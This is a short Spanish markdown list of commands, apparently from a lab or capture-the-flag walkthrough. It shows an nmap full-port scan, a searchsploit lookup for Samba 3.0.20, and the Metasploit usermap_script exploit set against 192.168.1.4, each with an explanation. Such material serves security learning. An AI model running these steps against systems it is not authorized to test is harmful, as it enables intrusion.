
# 🚀 Comandos Utilizados

## 1. 🔎 Escaneo de Puertos y Servicios con Nmap

```bash
nmap -sS -sV -sC -p- 192.168.1.4
```
- `-sS`: Escaneo SYN (stealth) 🕵️‍♂️
- `-sV`: Detección de versiones de servicios 🏷️
- `-sC`: Ejecución de scripts por defecto 📜
- `-p-`: Escanea todos los puertos 🌐

## 2. 🛡️ Búsqueda de Vulnerabilidades con Searchsploit

```bash
searchsploit samba 3.0.20
```
- Busca exploits conocidos para la versión específica de Samba 🐧

## 3. 💥 Explotación con Metasploit

```bash
use exploit/unix/samba/usermap_script
set RHOSTS 192.168.1.4
run
```
- Selecciona y configura el exploit para Samba ⚙️
- Define la IP objetivo 🎯
- Ejecuta el exploit 🚦